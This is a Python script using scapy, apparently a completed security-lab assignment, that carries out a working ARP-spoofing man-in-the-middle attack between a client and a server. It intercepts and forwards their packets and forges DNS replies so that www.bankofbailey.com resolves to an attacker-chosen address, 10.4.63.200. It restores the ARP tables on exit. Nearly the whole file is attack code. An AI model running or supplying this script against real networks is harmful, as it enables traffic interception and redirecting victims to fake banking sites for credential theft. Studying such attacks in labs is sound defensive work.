# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    SR_lists, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP, op=1), verbose=False)
    debug(SR_lists)
    debug(SR_lists[0][1].src)
    return SR_lists[0][1].src


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(srcIP=serverIP, srcMAC=attackerMAC, dstIP=clientIP, dstMAC=clientMAC) # TODO: Spoof client ARP table
        spoof(srcIP=clientIP, srcMAC=attackerMAC, dstIP=serverIP, dstMAC=serverMAC) # TODO: Spoof httpServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    arp_re = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC, op=2)
    send(arp_re, verbose=False)

# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_re = ARP(pdst=dstIP, hwdst=dstMAC, psrc=srcIP, hwsrc=srcMAC ,op=2)
    send(arp_re, verbose=False)


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC

    if packet.haslayer('UDP'):
        if packet[Ether].dst == attackerMAC:
            packet[Ether].dst = clientMAC if packet[Ether].src == serverMAC else serverMAC
            packet[Ether].src = attackerMAC
            # if the packet is from the client, just forward it. If it is from the server, modify the answer
            if packet[DNS].qr == 1:
                if packet.an.rrname == b'www.bankofbailey.com.' and packet[DNS].an:
                    packet[DNS].an.rdata = '10.4.63.200'
                    del packet[IP].len, packet[IP].chksum, packet[UDP].len, packet[UDP].chksum
                    packet = Packet(packet)
            sendp(packet)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
